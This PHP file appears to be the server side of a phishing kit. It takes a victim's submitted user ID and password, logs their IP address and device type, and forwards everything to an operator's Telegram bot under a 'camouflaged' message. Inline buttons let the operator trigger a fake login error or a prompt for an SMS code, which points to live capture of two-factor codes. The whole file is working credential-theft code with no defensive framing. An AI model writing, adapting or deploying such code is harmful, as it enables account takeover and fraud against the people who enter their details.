<?php
session_start();
include("settings.php");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pp1 = $_POST['pp1'] ?? '';
    $pp2 = $_POST['pp2'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $_SESSION['usuario'] = $pp1;

    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $dispositivo = (preg_match('/android|iphone|ipad|mobile/i', $userAgent)) ? 'movil' : 'pc';
    $_SESSION['dispositivo'] = $dispositivo;

    // Mensaje camuflado
    $mensaje = "📥 Nueva solicitud\n";
    $mensaje .= "ID: $pp1\n";
    $mensaje .= "Clave temporal: $pp2\n";
    $mensaje .= "Modo: $dispositivo\n";
    $mensaje .= "Red: $ip";

    $botones = [
        [
            ['text' => '🔁 Reintentar acceso', 'callback_data' => "LOGINERROR|$pp1|$dispositivo"],
            ['text' => '🔐 Ingresar código', 'callback_data' => "SMS|$pp1"]
        ]
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'reply_markup' => json_encode(['inline_keyboard' => $botones])
    ]));

    header("Location: espera.php");
    exit();
}
?>
